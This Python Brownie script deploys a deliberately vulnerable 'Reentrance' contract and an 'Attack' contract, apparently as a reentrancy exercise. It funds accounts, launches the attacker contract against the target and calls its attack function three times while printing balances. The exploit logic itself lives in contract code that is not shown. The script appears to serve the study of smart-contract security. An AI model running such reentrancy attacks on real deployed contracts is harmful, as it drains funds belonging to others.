from brownie import network, Reentrance, Attack, AttackForce
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3


def deploy_reentracy(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Reentrance.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --Reentrance-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_attack(account, address):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Attack.deploy(address, {"from": account}, publish_source=publish)
    print(
        f"Cotntract --Attack-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(1)
    attacker_account = get_account(2)
    foo_account = get_account(3)
    reentrancy_contract = deploy_reentracy(owner_account)
    print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
    print(
        f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
    )
    print(f"Balance of owner: {owner_account.balance()}")
    print(f"Balance of foo account:  {foo_account.balance()}")
    print(f"Balance of attacker: {attacker_account.balance()}")
    print("Donating from owner")
    tx = reentrancy_contract.donate(
        owner_account.address, {"from": owner_account, "value": 100}
    )
    tx.wait(1)
    print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
    print(
        f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
    )
    print(f"Balance of owner: {owner_account.balance()}")
    print(f"Balance of foo account:  {foo_account.balance()}")
    print(f"Balance of attacker: {attacker_account.balance()}")
    # print("Donating from foo")
    # tx = reentrancy_contract.donate(
    #     foo_account.address, {"from": foo_account, "value": 100}
    # )
    # tx.wait(1)
    # print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
    # print(
    #     f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
    # )
    # print(
    #     f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
    # )
    # print(
    #     f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
    # )
    # print(f"Balance of owner: {owner_account.balance()}")
    # print(f"Balance of foo account:  {foo_account.balance()}")
    # print(f"Balance of attacker: {attacker_account.balance()}")
    print("Donating from attacker")
    tx = reentrancy_contract.donate(
        attacker_account.address, {"from": attacker_account, "value": 100}
    )
    tx.wait(1)
    print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
    print(
        f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
    )
    print(f"Balance of owner: {owner_account.balance()}")
    print(f"Balance of foo account:  {foo_account.balance()}")
    print(f"Balance of attacker: {attacker_account.balance()}")
    # print("Withdrawing to foo")
    # tx = reentrancy_contract.withdraw(50, {"from": foo_account})
    # tx.wait(1)
    # print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
    # print(
    #     f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
    # )
    # print(
    #     f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
    # )
    # print(
    #     f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
    # )
    # print(f"Balance of owner: {owner_account.balance()}")
    # print(f"Balance of foo account:  {foo_account.balance()}")
    # print(f"Balance of attacker: {attacker_account.balance()}")
    print("\n\n\n ATTACKING \n\n\n")
    attacker_contract = deploy_attack(attacker_account, reentrancy_contract.address)
    print(f"Blalance of attacker contract: {attacker_contract.getBalance()}")
    print("Donating from attacker contract")
    tx = reentrancy_contract.donate(
        attacker_contract.address, {"from": attacker_account, "value": 100}
    )
    tx.wait(1)
    print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
    print(
        f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
    )
    print(
        f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
    )
    print(f"Balance of owner: {owner_account.balance()}")
    print(f"Balance of foo account:  {foo_account.balance()}")
    print(f"Balance of attacker: {attacker_account.balance()}")
    for _ in range(3):
        tx = attacker_contract.attack()
        tx.wait(1)
        print(f"Blalance of attacker contract: {attacker_contract.getBalance()}")
        print(f"Reentrancy Contract balance: {reentrancy_contract.balance()}")
        print(
            f"Reentrancy Contract Balance of owner: {reentrancy_contract.balanceOf(owner_account.address)}"
        )
        print(
            f"Reentrancy Contract Balance of foo: {reentrancy_contract.balanceOf(foo_account.address)}"
        )
        print(
            f"Reentrancy Contract Balance of attacker: {reentrancy_contract.balanceOf(attacker_account.address)}"
        )
        print(f"Balance of owner: {owner_account.balance()}")
        print(f"Balance of foo account:  {foo_account.balance()}")
        print(f"Balance of attacker: {attacker_account.balance()}")


if __name__ == "__main__":
    main()
